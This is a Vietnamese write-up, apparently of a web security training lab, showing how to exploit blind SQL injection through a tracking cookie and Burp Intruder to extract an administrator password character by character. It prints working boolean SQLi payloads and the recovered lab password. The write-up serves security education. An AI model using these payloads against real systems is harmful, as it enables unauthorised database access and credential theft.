# SQL Injection Lab 11: Blind SQL Injection with Conditional Responses

## Mục tiêu
Khai thác blind SQLi qua cookie `TrackingId` để tìm mật khẩu của `administrator`, sau đó đăng nhập và hoàn thành lab.

## Đề bài
<img src="images/11_blind-conditional-response-2026-04-14-23-29-49.png" alt="Lab overview" width="760" />
<br><br>

## Bước 1: Xác định điểm tiêm SQLi trong TrackingId
Bắt request bằng Burp Repeater và sửa trực tiếp cookie `TrackingId`.

<img src="images/11_blind-conditional-response-2026-04-14-23-32-31.png" alt="Burp Repeater với TrackingId" width="760" />
<br><br>

Payload đúng điều kiện:

```sql
' OR 1=1 --
```

Payload sai điều kiện:

```sql
' OR 1=2 --
```

Khi điều kiện đúng, trang có chuỗi `Welcome back!`; khi sai thì chuỗi này biến mất.

<img src="images/11_blind-conditional-response-2026-04-14-23-33-37.png" alt="Welcome back xuất hiện khi điều kiện đúng" width="760" />
<br><br>

## Bước 2: Xác nhận bảng users và user administrator tồn tại
Kiểm tra bảng `users` có dữ liệu:

```sql
' OR (SELECT 'a' FROM users LIMIT 1)='a' --
```

Kiểm tra tồn tại user `administrator`:

```sql
' OR (SELECT 'a' FROM users WHERE username='administrator')='a' --
```

<img src="images/11_blind-conditional-response-2026-04-14-23-47-18.png" alt="Xác nhận bảng users" width="760" />
<br><br>
<img src="images/11_blind-conditional-response-2026-04-14-23-48-39.png" alt="Xác nhận user administrator" width="760" />
<br><br>

## Bước 3: Dò độ dài mật khẩu
Dùng điều kiện độ dài để kiểm tra `Welcome back!`:

```sql
' OR (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a' --
```

Thiết lập Intruder (Sniper) với payload số từ `1..25` cho biểu thức `LENGTH(password)>§1§`.

<img src="images/11_blind-conditional-response-2026-04-14-23-51-48.png" alt="Cấu hình Intruder dò độ dài" width="760" />
<br><br>
<img src="images/11_blind-conditional-response-2026-04-14-23-53-31.png" alt="Kết quả Intruder dò độ dài" width="760" />
<br><br>

Quan sát cột `Length`: khi điều kiện còn đúng thì response dài hơn (có `Welcome back!`). Từ kết quả, suy ra độ dài mật khẩu là **20**.

<img src="images/11_blind-conditional-response-2026-04-14-23-56-29.png" alt="Suy ra độ dài password là 20" width="760" />
<br><br>

## Bước 4: Dò từng ký tự của mật khẩu
Payload điều kiện theo từng vị trí ký tự:

```sql
' OR (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§2§' --
```

Cấu hình Intruder `Cluster bomb`:
- Payload 1: số từ `1..20` (vị trí ký tự)
- Payload 2: danh sách ký tự `a-z` và `0-9`

<img src="images/11_blind-conditional-response-2026-04-15-00-04-40.png" alt="Cluster bomb payload vị trí" width="760" />
<br><br>
<img src="images/11_blind-conditional-response-2026-04-15-00-05-11.png" alt="Cluster bomb payload ký tự" width="760" />
<br><br>

Sort theo `Length` để chọn các request có phản hồi chứa `Welcome back!`, rồi ghép ký tự theo đúng vị trí. Từ kết quả trong ảnh, mật khẩu thu được là:

```text
9p34qp0ghkofsraakjaz
```

<img src="images/11_blind-conditional-response-2026-04-15-00-10-06.png" alt="Kết quả ghép ký tự password" width="760" />
<br><br>

## Bước 5: Đăng nhập administrator
Dùng mật khẩu tìm được để đăng nhập `administrator` và solve lab.

<img src="images/11_blind-conditional-response-2026-04-15-00-12-27.png" alt="Lab solved" width="760" />
<br><br>

## Payload solve

```sql
' OR (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§2§' --
```

## Kết quả
Lấy được mật khẩu `administrator` là `9p34qp0ghkofsraakjaz` và hoàn thành lab.
